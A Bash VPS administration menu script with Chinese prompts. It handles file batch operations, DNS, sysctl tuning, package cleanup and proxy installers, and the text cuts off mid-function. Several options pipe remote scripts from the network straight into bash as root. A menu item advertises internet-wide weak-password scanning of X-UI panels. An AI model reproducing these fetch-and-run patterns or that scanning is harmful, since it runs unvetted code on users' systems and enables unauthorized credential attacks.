#!/bin/bash

if [[ "$(id -u)" -ne 0 ]]; then
    echo "Please run this script as root."
    exit 1
fi

install_if_missing() {
    if ! type -P "$1" >/dev/null 2>&1; then
        echo "$1 is not installed, installing..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update
            apt-get install -y "$1"
        elif command -v yum >/dev/null 2>&1; then
            yum install -y "$1"
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y "$1"
        elif command -v zypper >/dev/null 2>&1; then
            zypper install -y "$1"
        else
            echo "Unsupported package manager. Please install $1 manually."
            exit 1
        fi
    fi
}

install_if_missing jq
install_if_missing sudo
install_if_missing curl
install_if_missing wget

# Function to create a permanent alias for the script
create_alias() {
    # Define the alias command, using the full path to the script
    alias_command="alias bcsb='$(realpath "$0")'"
    
    # Define the path to the bashrc file
    bashrc_file="/root/.bashrc"
    
    # Check if the .bashrc file exists, create it if it doesn't
    if [ ! -f "$bashrc_file" ]; then
        touch "$bashrc_file"
        echo "Created $bashrc_file"
    fi
    
    # Check if the alias already exists in the .bashrc file
    if ! grep -qF "alias bcsb=" "$bashrc_file"; then
        # If the alias does not exist, add it to the .bashrc file
        echo "$alias_command" >> "$bashrc_file"
        echo "别名 'bcsb' 已经添加到 $bashrc_file。"
        echo "请重新启动终端来使别名生效。"
        sleep 1
    fi
}

create_alias

show_menu() {
    echo -e "\033[34m=================================================\033[0m"
    echo -e "\033[34mBCSB一键脚本\033[0m"
    echo -e "\033[34m项目地址: https://github.com/cccchiban/BCSB\033[0m"
    echo -e "\033[34m更新时间：2025/8/20\033[0m"
    echo -e "\033[34m再次运行可输入'bcsb'后回车\033[0m"
    echo -e "\033[34m=================================================\033[0m"
    echo
    echo -e "\033[32m请选择一个操作:\033[0m"
    echo -e "\033[32m1)\033[0m 快捷操作"
    echo -e "\033[32m2)\033[0m 网络/性能"
    echo -e "\033[32m3)\033[0m 代理"
    echo -e "\033[32m4)\033[0m VPS测试"
    echo -e "\033[32m5)\033[0m 其他功能"
    echo -e "\033[32m6)\033[0m 安装常用环境及软件"
    echo -e "\033[32m7)\033[0m 退出"
}

quick_actions_menu() {
    echo -e "\033[32m快捷操作选项:\033[0m"
    echo -e "\033[32m1)\033[0m 批量删除文件"
    echo -e "\033[32m2)\033[0m 批量重命名/移动文件"
    echo -e "\033[32m3)\033[0m 批量杀进程"
    echo -e "\033[32m4)\033[0m 重启"
    echo -e "\033[32m5)\033[0m 查看内核版本"
    echo -e "\033[32m6)\033[0m 禁用/启用ICMP"
    echo -e "\033[32m7)\033[0m 系统更新"
    echo -e "\033[32m8)\033[0m DNS管理"
    echo -e "\033[32m9)\033[0m 文件锁定"
    echo -e "\033[32m10)\033[0m 时区设置"
    echo -e "\033[32m11)\033[0m 文件搜索"
    echo -e "\033[32m12)\033[0m 清理无用包"
    echo -e "\033[32m13)\033[0m 返回主菜单"
}

batch_delete_files() {
    clear
    echo "批量删除文件"
    echo "================"
    
    read -p "请输入要删除的文件目录路径: " target_dir
    if [[ ! -d "$target_dir" ]]; then
        echo "错误：目录不存在！"
        read -p "按回车键返回..."
        return
    fi
    
    read -p "请输入要删除的文件类型（如 *.log, *.tmp 等，留空删除所有文件）: " file_pattern
    if [[ -z "$file_pattern" ]]; then
        file_pattern="*"
    fi
    
    echo "即将删除 $target_dir 目录下所有匹配 $file_pattern 的文件"
    echo "当前目录中的文件："
    find "$target_dir" -name "$file_pattern" -type f | head -20
    
    read -p "确认删除吗？(y/N): " confirm
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        count=$(find "$target_dir" -name "$file_pattern" -type f | wc -l)
        find "$target_dir" -name "$file_pattern" -type f -delete
        echo "已删除 $count 个文件"
    else
        echo "取消删除操作"
    fi
    
    read -p "按回车键返回..."
}

batch_rename_move_files() {
    clear
    echo "批量重命名/移动文件"
    echo "===================="
    
    echo "1) 批量重命名文件"
    echo "2) 批量移动文件"
    read -p "请选择操作 (1-2): " operation
    
    case $operation in
        1)
            read -p "请输入文件目录路径: " target_dir
            if [[ ! -d "$target_dir" ]]; then
                echo "错误：目录不存在！"
                read -p "按回车键返回..."
                return
            fi
            
            read -p "请输入要重命名的文件类型（如 *.txt, *.jpg 等）: " file_pattern
            read -p "请输入替换前缀（可选）: " old_prefix
            read -p "请输入新前缀: " new_prefix
            
            if [[ -z "$file_pattern" ]]; then
                echo "错误：请输入文件类型"
                read -p "按回车键返回..."
                return
            fi
            
            count=0
            for file in "$target_dir"/$file_pattern; do
                if [[ -f "$file" ]]; then
                    filename=$(basename "$file")
                    if [[ -n "$old_prefix" ]]; then
                        new_filename="${filename/$old_prefix/$new_prefix}"
                    else
                        new_filename="${new_prefix}${filename}"
                    fi
                    mv "$file" "$target_dir/$new_filename"
                    echo "重命名: $filename -> $new_filename"
                    ((count++))
                fi
            done
            echo "已重命名 $count 个文件"
            ;;
        2)
            read -p "请输入源目录路径: " source_dir
            if [[ ! -d "$source_dir" ]]; then
                echo "错误：源目录不存在！"
                read -p "按回车键返回..."
                return
            fi
            
            read -p "请输入目标目录路径: " target_dir
            if [[ ! -d "$target_dir" ]]; then
                echo "目标目录不存在，正在创建..."
                mkdir -p "$target_dir"
            fi
            
            read -p "请输入要移动的文件类型（如 *.txt, *.jpg 等，留空移动所有文件）: " file_pattern
            if [[ -z "$file_pattern" ]]; then
                file_pattern="*"
            fi
            
            count=0
            for file in "$source_dir"/$file_pattern; do
                if [[ -f "$file" ]]; then
                    mv "$file" "$target_dir/"
                    echo "移动: $(basename "$file") -> $target_dir/"
                    ((count++))
                fi
            done
            echo "已移动 $count 个文件"
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

batch_kill_processes() {
    clear
    echo "批量杀进程"
    echo "==========="
    
    echo "1) 按进程名杀进程"
    echo "2) 按端口号杀进程"
    echo "3) 查看当前进程列表"
    read -p "请选择操作 (1-3): " operation
    
    case $operation in
        1)
            read -p "请输入进程名称（如 nginx, mysql, apache2 等）: " process_name
            if [[ -z "$process_name" ]]; then
                echo "错误：请输入进程名称"
                read -p "按回车键返回..."
                return
            fi
            
            echo "正在查找进程 $process_name..."
            pids=$(pgrep -f "$process_name")
            if [[ -z "$pids" ]]; then
                echo "未找到进程 $process_name"
            else
                echo "找到以下进程："
                ps aux | grep -E "$process_name" | grep -v grep
                read -p "确认杀死这些进程吗？(y/N): " confirm
                if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
                    pkill -f "$process_name"
                    echo "已杀死进程 $process_name"
                else
                    echo "取消操作"
                fi
            fi
            ;;
        2)
            read -p "请输入端口号: " port_num
            if [[ -z "$port_num" || ! "$port_num" =~ ^[0-9]+$ ]]; then
                echo "错误：请输入有效的端口号"
                read -p "按回车键返回..."
                return
            fi
            
            echo "正在查找占用端口 $port_num 的进程..."
            pids=$(lsof -ti:$port_num 2>/dev/null)
            if [[ -z "$pids" ]]; then
                echo "端口 $port_num 未被占用"
            else
                echo "占用端口 $port_num 的进程："
                lsof -i:$port_num
                read -p "确认杀死这些进程吗？(y/N): " confirm
                if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
                    kill -9 $pids 2>/dev/null
                    echo "已杀死占用端口 $port_num 的进程"
                else
                    echo "取消操作"
                fi
            fi
            ;;
        3)
            echo "当前进程列表（前20个）："
            ps aux --sort=-%cpu | head -20
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

system_reboot() {
    clear
    echo "系统重启"
    echo "========"
    
    echo "警告：重启将中断所有正在运行的程序和服务"
    read -p "确认重启系统吗？(y/N): " confirm
    
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "系统将在3秒后重启..."
        sleep 3
        reboot
    else
        echo "取消重启操作"
        read -p "按回车键返回..."
    fi
}

show_kernel_version() {
    clear
    echo "内核版本信息"
    echo "============"
    
    echo "当前内核版本："
    uname -a
    
    echo ""
    echo "系统信息："
    cat /etc/os-release 2>/dev/null || echo "无法获取系统信息"
    
    echo ""
    echo "已安装的内核："
    if command -v dpkg >/dev/null 2>&1; then
        dpkg -l | grep linux-image | grep -v "^rc" | awk '{print $2 " " $3}'
    elif command -v rpm >/dev/null 2>&1; then
        rpm -qa | grep kernel
    else
        echo "无法获取内核信息"
    fi
    
    read -p "按回车键返回..."
}

quick_manage_icmp() {
    clear
    echo "ICMP 管理快捷操作"
    echo "================="
    
    echo "当前 ICMP 状态："
    if sysctl net.ipv4.icmp_echo_ignore_all | grep -q "1"; then
        echo "ICMP 已禁用"
    else
        echo "ICMP 已启用"
    fi
    
    echo ""
    echo "1) 禁用 ICMP"
    echo "2) 启用 ICMP"
    echo "3) 返回上级菜单"
    read -p "请选择操作 (1-3): " icmp_choice
    
    case $icmp_choice in
        1)
            sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
            sudo sed -i '/net.ipv4.icmp_echo_ignore_all/d' /etc/sysctl.conf
            echo "net.ipv4.icmp_echo_ignore_all=1" | sudo tee -a /etc/sysctl.conf
            echo "ICMP 已禁用"
            ;;
        2)
            sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
            sudo sed -i '/net.ipv4.icmp_echo_ignore_all/d' /etc/sysctl.conf
            echo "net.ipv4.icmp_echo_ignore_all=0" | sudo tee -a /etc/sysctl.conf
            echo "ICMP 已启用"
            ;;
        3)
            return
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

system_update() {
    clear
    echo "系统更新"
    echo "========"
    
    echo "当前系统信息："
    cat /etc/os-release 2>/dev/null | grep "PRETTY_NAME" | cut -d'"' -f2
    
    echo ""
    echo "可更新的软件包："
    if command -v apt >/dev/null 2>&1; then
        apt list --upgradable 2>/dev/null | wc -l
        echo "个软件包可以更新"
    elif command -v yum >/dev/null 2>&1; then
        yum check-update | wc -l
        echo "个软件包可以更新"
    elif command -v dnf >/dev/null 2>&1; then
        dnf check-update | wc -l
        echo "个软件包可以更新"
    else
        echo "无法检测包管理器"
        read -p "按回车键返回..."
        return
    fi
    
    echo ""
    read -p "确认更新系统吗？这将需要一些时间。(y/N): " confirm
    
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "开始更新系统..."
        if command -v apt >/dev/null 2>&1; then
            apt update && apt upgrade -y
        elif command -v yum >/dev/null 2>&1; then
            yum update -y
        elif command -v dnf >/dev/null 2>&1; then
            dnf update -y
        fi
        
        if [[ $? -eq 0 ]]; then
            echo "系统更新完成！"
        else
            echo "更新过程中出现错误"
        fi
    else
        echo "取消更新操作"
    fi
    
    read -p "按回车键返回..."
}

dns_management() {
    clear
    echo "DNS管理"
    echo "======="
    
    echo "当前DNS配置："
    if [[ -f /etc/resolv.conf ]]; then
        cat /etc/resolv.conf
    else
        echo "无法找到DNS配置文件"
    fi
    
    echo ""
    echo "1) 编辑DNS配置"
    echo "2) 恢复默认DNS"
    echo "3) 使用常用DNS服务器"
    echo "4) 返回上级菜单"
    read -p "请选择操作 (1-4): " dns_choice
    
    case $dns_choice in
        1)
            echo "当前DNS配置："
            cat /etc/resolv.conf 2>/dev/null || echo "文件不存在"
            echo ""
            read -p "请输入新的DNS服务器（多个用空格分隔，如：8.8.8.8 8.8.4.4）: " new_dns
            if [[ -n "$new_dns" ]]; then
                cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null
                > /etc/resolv.conf
                for dns in $new_dns; do
                    echo "nameserver $dns" >> /etc/resolv.conf
                done
                echo "DNS配置已更新"
                echo "新的DNS配置："
                cat /etc/resolv.conf
            else
                echo "DNS服务器不能为空"
            fi
            ;;
        2)
            if [[ -f /etc/resolv.conf.backup ]]; then
                cp /etc/resolv.conf.backup /etc/resolv.conf
                echo "已恢复默认DNS配置"
            else
                echo "无法找到备份文件，正在恢复系统默认..."
                > /etc/resolv.conf
                echo "nameserver 8.8.8.8" >> /etc/resolv.conf
                echo "nameserver 8.8.4.4" >> /etc/resolv.conf
                echo "已恢复为Google DNS"
            fi
            ;;
        3)
            echo "选择常用DNS服务器："
            echo "1) Google DNS (8.8.8.8, 8.8.4.4)"
            echo "2) Cloudflare DNS (1.1.1.1, 1.0.0.1)"
            echo "3) OpenDNS (208.67.222.222, 208.67.220.220)"
            echo "4) 阿里DNS (223.5.5.5, 223.6.6.6)"
            read -p "请选择 (1-4): " dns_preset
            
            case $dns_preset in
                1)
                    cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null
                    > /etc/resolv.conf
                    echo "nameserver 8.8.8.8" >> /etc/resolv.conf
                    echo "nameserver 8.8.4.4" >> /etc/resolv.conf
                    echo "已设置为Google DNS"
                    ;;
                2)
                    cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null
                    > /etc/resolv.conf
                    echo "nameserver 1.1.1.1" >> /etc/resolv.conf
                    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
                    echo "已设置为Cloudflare DNS"
                    ;;
                3)
                    cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null
                    > /etc/resolv.conf
                    echo "nameserver 208.67.222.222" >> /etc/resolv.conf
                    echo "nameserver 208.67.220.220" >> /etc/resolv.conf
                    echo "已设置为OpenDNS"
                    ;;
                4)
                    cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null
                    > /etc/resolv.conf
                    echo "nameserver 223.5.5.5" >> /etc/resolv.conf
                    echo "nameserver 223.6.6.6" >> /etc/resolv.conf
                    echo "已设置为阿里DNS"
                    ;;
                *)
                    echo "无效的选择"
                    ;;
            esac
            ;;
        4)
            return
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

file_lock_management() {
    clear
    echo "文件锁定管理"
    echo "==========="
    
    echo "1) 锁定文件"
    echo "2) 解锁文件"
    echo "3) 查看文件锁定状态"
    echo "4) 返回上级菜单"
    read -p "请选择操作 (1-4): " lock_choice
    
    case $lock_choice in
        1)
            read -p "请输入要锁定的文件路径: " file_path
            if [[ -z "$file_path" ]]; then
                echo "文件路径不能为空"
            elif [[ ! -e "$file_path" ]]; then
                echo "文件不存在：$file_path"
            else
                chattr +i "$file_path" 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "文件已锁定：$file_path"
                else
                    echo "锁定失败，请检查权限或文件系统支持"
                fi
            fi
            ;;
        2)
            read -p "请输入要解锁的文件路径: " file_path
            if [[ -z "$file_path" ]]; then
                echo "文件路径不能为空"
            elif [[ ! -e "$file_path" ]]; then
                echo "文件不存在：$file_path"
            else
                chattr -i "$file_path" 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "文件已解锁：$file_path"
                else
                    echo "解锁失败，请检查权限"
                fi
            fi
            ;;
        3)
            read -p "请输入要检查的文件路径（留空检查当前目录）: " file_path
            if [[ -z "$file_path" ]]; then
                file_path="."
            fi
            
            echo "检查文件锁定状态："
            if [[ -f "$file_path" ]]; then
                lsattr "$file_path" 2>/dev/null || echo "无法获取文件属性"
            elif [[ -d "$file_path" ]]; then
                echo "目录中锁定状态的文件："
                find "$file_path" -type f -exec lsattr {} + 2>/dev/null | grep "i" || echo "未找到锁定的文件"
            else
                echo "路径不存在：$file_path"
            fi
            ;;
        4)
            return
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

timezone_management() {
    clear
    echo "时区设置"
    echo "======="
    
    echo "当前时区："
    timedatectl status 2>/dev/null | grep "Time zone" || echo "无法获取时区信息"
    
    echo ""
    echo "1) 设置时区"
    echo "2) 列出所有可用时区"
    echo "3) 同步系统时间"
    echo "4) 返回上级菜单"
    read -p "请选择操作 (1-4): " timezone_choice
    
    case $timezone_choice in
        1)
            echo "常用时区："
            echo "1) Asia/Shanghai (中国标准时间)"
            echo "2) Asia/Tokyo (日本标准时间)"
            echo "3) Asia/Seoul (韩国标准时间)"
            echo "4) America/New_York (美国东部时间)"
            echo "5) Europe/London (英国时间)"
            echo "6) 自定义时区"
            read -p "请选择时区 (1-6): " tz_preset
            
            case $tz_preset in
                1) timezone="Asia/Shanghai" ;;
                2) timezone="Asia/Tokyo" ;;
                3) timezone="Asia/Seoul" ;;
                4) timezone="America/New_York" ;;
                5) timezone="Europe/London" ;;
                6) 
                    read -p "请输入时区（如：Asia/Shanghai）: " timezone
                    ;;
                *)
                    echo "无效的选择"
                    read -p "按回车键返回..."
                    return
                    ;;
            esac
            
            if [[ -n "$timezone" ]]; then
                timedatectl set-timezone "$timezone" 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "时区已设置为：$timezone"
                    echo "新的时间：$(date)"
                else
                    echo "设置时区失败，请检查权限或时区名称"
                fi
            fi
            ;;
        2)
            echo "可用时区列表："
            timedatectl list-timezones 2>/dev/null | less || echo "无法获取时区列表"
            ;;
        3)
            echo "正在同步系统时间..."
            if command -v ntpdate >/dev/null 2>&1; then
                ntpdate pool.ntp.org 2>/dev/null && echo "时间同步成功" || echo "时间同步失败"
            elif command -v chronyd >/dev/null 2>&1; then
                chronyc -a makestep && echo "时间同步成功" || echo "时间同步失败"
            else
                echo "未找到时间同步工具，正在安装..."
                if command -v apt >/dev/null 2>&1; then
                    apt update && apt install -y ntpdate
                    ntpdate pool.ntp.org
                elif command -v yum >/dev/null 2>&1; then
                    yum install -y ntpdate
                    ntpdate pool.ntp.org
                fi
            fi
            ;;
        4)
            return
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

file_search_and_process() {
    clear
    echo "文件搜索和处理"
    echo "==============="
    
    read -p "请输入搜索目录路径（留空为当前目录）: " search_dir
    if [[ -z "$search_dir" ]]; then
        search_dir="."
    fi
    
    if [[ ! -d "$search_dir" ]]; then
        echo "目录不存在：$search_dir"
        read -p "按回车键返回..."
        return
    fi
    
    read -p "请输入文件名模式（如 *.log, *.tmp, test* 等）: " file_pattern
    if [[ -z "$file_pattern" ]]; then
        file_pattern="*"
    fi
    
    echo ""
    echo "搜索结果："
    found_files=()
    while IFS= read -r -d '' file; do
        found_files+=("$file")
        echo "$(( ${#found_files[@]} )): $file"
    done < <(find "$search_dir" -name "$file_pattern" -type f -print0 2>/dev/null)
    
    if [[ ${#found_files[@]} -eq 0 ]]; then
        echo "未找到匹配的文件"
        read -p "按回车键返回..."
        return
    fi
    
    echo ""
    echo "找到 ${#found_files[@]} 个文件"
    echo "1) 删除所有找到的文件"
    echo "2) 移动所有找到的文件"
    echo "3) 重命名所有找到的文件"
    echo "4) 查看文件详情"
    echo "5) 返回上级菜单"
    read -p "请选择操作 (1-5): " process_choice
    
    case $process_choice in
        1)
            read -p "确认删除所有 ${#found_files[@]} 个文件吗？(y/N): " confirm
            if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
                count=0
                for file in "${found_files[@]}"; do
                    rm -f "$file" 2>/dev/null && ((count++))
                done
                echo "已删除 $count 个文件"
            else
                echo "取消删除操作"
            fi
            ;;
        2)
            read -p "请输入目标目录路径: " target_dir
            if [[ -z "$target_dir" ]]; then
                echo "目标目录不能为空"
            else
                mkdir -p "$target_dir" 2>/dev/null
                count=0
                for file in "${found_files[@]}"; do
                    mv "$file" "$target_dir/" 2>/dev/null && ((count++))
                done
                echo "已移动 $count 个文件到 $target_dir"
            fi
            ;;
        3)
            read -p "请输入重命名前缀: " prefix
            count=0
            for file in "${found_files[@]}"; do
                filename=$(basename "$file")
                new_name="${prefix}${filename}"
                mv "$file" "$(dirname "$file")/$new_name" 2>/dev/null && ((count++))
            done
            echo "已重命名 $count 个文件"
            ;;
        4)
            echo "文件详情："
            for file in "${found_files[@]}"; do
                echo "文件：$file"
                echo "大小：$(du -h "$file" | cut -f1)"
                echo "修改时间：$(stat -c %y "$file" 2>/dev/null || stat -f %Sm "$file" 2>/dev/null)"
                echo "权限：$(ls -ld "$file" | awk '{print $1}')"
                echo "---"
            done
            ;;
        5)
            return
            ;;
        *)
            echo "无效的选择"
            ;;
    esac
    
    read -p "按回车键返回..."
}

cleanup_unused_packages() {
    clear
    echo "清理无用软件包"
    echo "============="
    
    echo "当前系统信息："
    cat /etc/os-release 2>/dev/null | grep "PRETTY_NAME" | cut -d'"' -f2
    
    echo ""
    echo "可清理的项目："
    
    if command -v apt >/dev/null 2>&1; then
        echo "1) 清理 apt 缓存"
        echo "2) 删除不需要的软件包"
        echo "3) 清理旧内核"
        echo "4) 清理临时文件"
        echo "5) 全面清理"
        echo "6) 返回上级菜单"
        
        read -p "请选择操作 (1-6): " cleanup_choice
        
        case $cleanup_choice in
            1)
                echo "清理 apt 缓存..."
                apt-get clean
                echo "apt 缓存已清理"
                ;;
            2)
                echo "删除不需要的软件包..."
                apt-get autoremove -y
                echo "不需要的软件包已删除"
                ;;
            3)
                echo "清理旧内核..."
                apt-get --purge autoremove -y
                echo "旧内核已清理"
                ;;
            4)
                echo "清理临时文件..."
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                echo "临时文件已清理"
                ;;
            5)
                echo "全面清理系统..."
                apt-get update
                apt-get upgrade -y
                apt-get autoremove -y
                apt-get autoclean -y
                apt-get clean
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                journalctl --vacuum-time=2d 2>/dev/null
                echo "系统全面清理完成"
                ;;
            6)
                return
                ;;
            *)
                echo "无效的选择"
                ;;
        esac
        
    elif command -v yum >/dev/null 2>&1; then
        echo "1) 清理 yum 缓存"
        echo "2) 删除不需要的软件包"
        echo "3) 清理临时文件"
        echo "4) 全面清理"
        echo "5) 返回上级菜单"
        
        read -p "请选择操作 (1-5): " cleanup_choice
        
        case $cleanup_choice in
            1)
                echo "清理 yum 缓存..."
                yum clean all
                echo "yum 缓存已清理"
                ;;
            2)
                echo "删除不需要的软件包..."
                yum autoremove -y
                echo "不需要的软件包已删除"
                ;;
            3)
                echo "清理临时文件..."
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                echo "临时文件已清理"
                ;;
            4)
                echo "全面清理系统..."
                yum update -y
                yum autoremove -y
                yum clean all
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                echo "系统全面清理完成"
                ;;
            5)
                return
                ;;
            *)
                echo "无效的选择"
                ;;
        esac
        
    elif command -v dnf >/dev/null 2>&1; then
        echo "1) 清理 dnf 缓存"
        echo "2) 删除不需要的软件包"
        echo "3) 清理临时文件"
        echo "4) 全面清理"
        echo "5) 返回上级菜单"
        
        read -p "请选择操作 (1-5): " cleanup_choice
        
        case $cleanup_choice in
            1)
                echo "清理 dnf 缓存..."
                dnf clean all
                echo "dnf 缓存已清理"
                ;;
            2)
                echo "删除不需要的软件包..."
                dnf autoremove -y
                echo "不需要的软件包已删除"
                ;;
            3)
                echo "清理临时文件..."
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                echo "临时文件已清理"
                ;;
            4)
                echo "全面清理系统..."
                dnf update -y
                dnf autoremove -y
                dnf clean all
                rm -rf /tmp/* 2>/dev/null
                rm -rf /var/tmp/* 2>/dev/null
                echo "系统全面清理完成"
                ;;
            5)
                return
                ;;
            *)
                echo "无效的选择"
                ;;
        esac
    else
        echo "不支持的包管理器"
        read -p "按回车键返回..."
        return
    fi
    
    read -p "按回车键返回..."
}

network_menu() {
    echo -e "\033[32m网络选项:\033[0m"
    echo -e "\033[32m1)\033[0m 核心参数优化"
    echo -e "\033[32m2)\033[0m 安装大小包测试 nexttrace"
    echo -e "\033[32m3)\033[0m 安装 DDNS 脚本"
    echo -e "\033[32m4)\033[0m 小鸡剑皇脚本"
    echo -e "\033[32m5)\033[0m 一键开启BBR"
    echo -e "\033[32m6)\033[0m 多功能BBR安装脚本"
    echo -e "\033[32m7)\033[0m TCP窗口调优"
    echo -e "\033[32m8)\033[0m 测试访问优先级"
    echo -e "\033[32m9)\033[0m 25端口开放测试"
    echo -e "\033[32m10)\033[0m 调整ipv4/6优先访问（非直接禁用）"
    echo -e "\033[32m11)\033[0m 禁用启用ICMP"
    echo -e "\033[32m12)\033[0m WARP"
    echo -e "\033[32m13)\033[0m vnStat流量监控"
    echo -e "\033[32m14)\033[0m iftop网络通信监控"
    echo -e "\033[32m15)\033[0m 安装cloud低占用内核"
    echo -e "\033[32m16)\033[0m 删除内核优化参数"
    echo -e "\033[32m17)\033[0m TCP调优"
    echo -e "\033[32m18)\033[0m 返回主菜单"
}

proxy_menu() {
    echo -e "\033[32m代理选项:\033[0m"
    echo -e "\033[32m1)\033[0m xray管理"
    echo -e "\033[32m2)\033[0m 安装mieru（改自MisakaNo）"
    echo -e "\033[32m3)\033[0m v2bx一键安装脚本"
    echo -e "\033[32m4)\033[0m v2ray-agent八合一一键脚本"
    echo -e "\033[32m5)\033[0m 安装 Xboard"
    echo -e "\033[32m6)\033[0m 安装极光转发面板"
    echo -e "\033[32m7)\033[0m 安装咸蛋转发面板"
    echo -e "\033[32m8)\033[0m hy2一键脚本"
    echo -e "\033[32m9)\033[0m DNS解锁服务器搭建"
    echo -e "\033[32m10)\033[0m X-UI弱密码全网扫描"
    echo -e "\033[32m11)\033[0m ss-plugins（支持ss2022+流量混淆）"
    echo -e "\033[32m12)\033[0m 233boy/xray一键脚本"
    echo -e "\033[32m13)\033[0m realm&Gost转发脚本"
    echo -e "\033[32m14)\033[0m 安装哆啦A梦转发面板"
    echo -e "\033[32m15)\033[0m 返回主菜单"
}

forward_panel() {
    clear
    echo "安装哆啦A梦转发面板..."
    curl -L https://raw.githubusercontent.com/bqlpfy/forward-panel/refs/heads/main/panel_install.sh -o panel_install.sh && chmod +x panel_install.sh && ./panel_install.sh
    echo "安装完成。按回车键返回菜单。"
    read -r
}

vps_test_menu() {
    echo -e "\033[32mVPS测试选项:\033[0m"
    echo -e "\033[32m1)\033[0m 综合测试脚本"
    echo -e "\033[32m2)\033[0m 性能测试"
    echo -e "\033[32m3)\033[0m 流媒体及 IP 质量测试"
    echo -e "\033[32m4)\033[0m 网络测试"
    echo -e "\033[32m5)\033[0m 返回主菜单"
}

network_test_submenu() {
    clear
    echo "选择一个网络测试脚本:"
    echo -e "\033[32m1)\033[0m 三网测速脚本"
    echo -e "\033[32m2)\033[0m 回程测试脚本"
    echo -e "\033[32m3)\033[0m 网络质量体检"
    echo -e "\033[32m4)\033[0m iperf3网络测试"
    echo -e "\033[32m5)\033[0m 返回上一级"
    read -p "请输入你的选择: " network_test_choice
    case $network_test_choice in
        1) network_speed_test_script ;;
        2) backtrace_test_script ;;
        3) bash <(curl -sL Net.Check.Place) ;;
        4) iperf3_test_script ;;
        5) return ;;
        *) echo "无效的选择，请重试。" ;;
    esac
}

TCP_Optimization_Tool() {
    clear
    echo "正在下载并执行 TCP 优化脚本..."
    wget -q https://raw.githubusercontent.com/BlackSheep-cry/TCP-Optimization-Tool/main/tool.sh -O tool.sh && chmod +x tool.sh && ./tool.sh
    echo "脚本执行完成。按回车键返回菜单。"
    read -r
}

kernel_optimization() {
    clear
    echo "正在编辑 /etc/sysctl.conf 文件..."
    
    sudo bash -c 'cat << EOF >> /etc/sysctl.conf
net.ipv4.tcp_no_metrics_save=1
net.ipv4.tcp_ecn=0
net.ipv4.tcp_frto=1
net.ipv4.tcp_mtu_probing=0
net.ipv4.tcp_rfc1337=0
net.ipv4.tcp_sack=1
net.ipv4.tcp_fack=1
net.ipv4.tcp_window_scaling=1
net.ipv4.tcp_adv_win_scale=1
net.ipv4.tcp_moderate_rcvbuf=1
net.ipv4.tcp_timestamps=1
net.ipv4.tcp_fastopen=3
net.core.rmem_max=33554432
net.core.wmem_max=33554432
net.ipv4.tcp_rmem=4096 131072 33554432
net.ipv4.tcp_wmem=4096 16384 33554432
net.ipv4.udp_rmem_min=8192
net.ipv4.udp_wmem_min=8192
net.ipv4.ip_forward=1
net.ipv4.conf.all.route_localnet=1
net.ipv4.conf.all.forwarding=1
net.ipv4.conf.default.forwarding=1
net.core.default_qdisc=fq
net.ipv4.tcp_congestion_control=bbr
vm.swappiness=10
kernel.panic=10
EOF'

    echo "应用配置..."
    sudo sysctl -p

    echo "核心优化完成。按回车键返回菜单。"
    read -r
}

install_and_test_nexttrace() {
    clear
    echo "安装 nexttrace..."
    curl -L nxtrace.org/nt | bash

    echo "配置 nexttrace..."
    export NEXTTRACE_POWPROVIDER=sakura

    while true; do
        clear
        echo "请选择测试类型:"
        echo "1) 大包测试 (1450 bytes)"
        echo "2) 小包测试 (30 bytes)"
        echo "3) 返回主菜单"
        read -p "请输入你的选择: " test_choice

        case $test_choice in
            1) 
                read -p "请输入要测试的 IP 地址: " ip
                nexttrace -T --psize 1450 $ip -p 80
                read -p "按回车键继续..."
                ;;
            2) 
                read -p "请输入要测试的 IP 地址: " ip
                nexttrace -T --psize 30 $ip -p 80
                read -p "按回车键继续..."
                ;;
            3)
                break
                ;;
            *)
                echo "无效的选择，请重试。"
                read -p "按回车键继续..."
                ;;
        esac
    done
}

install_ddns_script() {
    clear
    echo "下载并运行 DDNS 脚本..."
    curl -sS -o /root/cf-v4-ddns.sh https://raw.githubusercontent.com/aipeach/cloudflare-api-v4-ddns/master/cf-v4-ddns.sh
    chmod +x /root/cf-v4-ddns.sh
    echo "脚本下载完成并已赋予执行权限。"

    read -p "请输入你的CF的Global密钥: " CFKEY
    while [[ -z "$CFKEY" ]]; do
        echo "Global密钥不能为空，请重试。"
        read -p "请输入你的CF的Global密钥: " CFKEY
    done

    read -p "请输入你的CF账号: " CFUSER
    while [[ -z "$CFUSER" ]]; do
        echo "CF账号不能为空，请重试。"
        read -p "请输入你的CF账号: " CFUSER
    done

    read -p "请输入需要用来 DDNS 的一级域名 (例如: baidu.com): " CFZONE_NAME
    while [[ -z "$CFZONE_NAME" ]]; do
        echo "一级域名不能为空，请重试。"
